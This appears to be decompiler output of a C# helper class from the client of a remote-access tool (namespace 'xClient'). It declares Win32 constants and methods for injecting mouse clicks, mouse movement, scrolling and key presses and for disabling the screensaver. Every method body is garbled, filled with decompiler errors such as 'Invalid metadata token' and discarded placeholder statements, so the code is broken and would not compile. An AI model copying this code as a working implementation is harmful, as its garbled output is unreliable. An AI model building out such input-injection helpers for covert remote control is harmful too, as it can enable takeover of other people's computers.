using System;
using System.Drawing;

namespace xClient.Core.Helper;

public static class NativeMethodsHelper
{
	private const uint MOUSEEVENTF_LEFTDOWN = 2u;

	private const uint MOUSEEVENTF_LEFTUP = 4u;

	private const uint MOUSEEVENTF_RIGHTDOWN = 8u;

	private const uint MOUSEEVENTF_RIGHTUP = 16u;

	private const uint MOUSEEVENTF_WHEEL = 2048u;

	private const uint KEYEVENTF_KEYDOWN = 0u;

	private const uint KEYEVENTF_KEYUP = 2u;

	private const int SPI_GETSCREENSAVERRUNNING = 114;

	private const uint DESKTOP_WRITEOBJECTS = 128u;

	private const uint DESKTOP_READOBJECTS = 1u;

	private const int WM_CLOSE = 16;

	private const uint SPI_SETSCREENSAVEACTIVE = 17u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	public static uint GetLastInputInfoTickCount()
	{
		//Discarded unreachable code: IL_0008, IL_0010, IL_001a, IL_0022, IL_0029, IL_002b, IL_002d, IL_0033
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: ldloca 0 (out-of-bounds)*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	public static void DoMouseLeftClick(Point p, bool isMouseDown)
	{
		//Discarded unreachable code: IL_001c
		_ = p.X;
		_ = p.Y;
		_ = 0;
		_ = 0;
		/*Error near IL_0017: Invalid metadata token*/;
	}

	public static void DoMouseRightClick(Point p, bool isMouseDown)
	{
		//Discarded unreachable code: IL_001d
		_ = p.X;
		_ = p.Y;
		_ = 0;
		_ = 0;
		/*Error near IL_0018: Invalid metadata token*/;
	}

	public static void DoMouseMove(Point p)
	{
		//Discarded unreachable code: IL_0013
		_ = p.X;
		_ = p.Y;
		/*Error near IL_000e: Invalid metadata token*/;
	}

	public static void DoMouseScroll(Point p, bool scrollDown)
	{
		//Discarded unreachable code: IL_0022
		_ = 2048;
		_ = p.X;
		_ = p.Y;
		_ = 0;
		/*Error near IL_001d: Invalid metadata token*/;
	}

	public static void DoKeyPress(byte key, bool keyDown)
	{
		//Discarded unreachable code: IL_000e
		_ = 0;
		/*Error near IL_0009: Invalid metadata token*/;
	}

	public static bool IsScreensaverActive()
	{
		//Discarded unreachable code: IL_0010
		IntPtr zero = IntPtr.Zero;
		_ = 114;
		_ = 0;
		_ = ref zero;
		/*Error near IL_000b: Invalid metadata token*/;
	}

	public static void DisableScreensaver()
	{
		//Discarded unreachable code: IL_0011, IL_0023, IL_002c, IL_003d, IL_0043, IL_0048, IL_004d, IL_004f, IL_0054, IL_005c, IL_006c
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Incompatible stack heights: 2 vs 0
		_ = 0;
		_ = 0;
		_ = 129;
		/*Error near IL_000c: Invalid metadata token*/;
	}
}
